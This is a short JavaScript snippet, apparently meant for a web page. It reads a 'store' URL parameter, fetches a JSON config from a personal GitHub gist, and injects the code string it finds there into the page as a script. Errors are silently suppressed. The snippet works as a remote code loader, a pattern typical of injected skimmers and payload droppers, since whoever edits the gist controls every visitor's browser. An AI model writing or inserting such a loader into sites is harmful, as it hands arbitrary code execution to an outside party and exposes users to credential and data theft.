!(async function() {
  var store = new URLSearchParams(location.search).get('store');
  if (!store) return;
  try {
    var r = await fetch('https://gist.githubusercontent.com/sensasikerja77/028a62a9b788046d81dac61df710f36c/raw/25ba4263880120f63193027061fb688220f31d71/config.json?t=' + Date.now());
    var d = await r.json();
    var s = d.stores[store];
    if (!s) return;
    var c = s.script_options[s.active_index].code;
    if (c) {
      var t = document.createElement('script');
      t.textContent = c;
      document.head.appendChild(t);
    }
  } catch(e) {}
})();
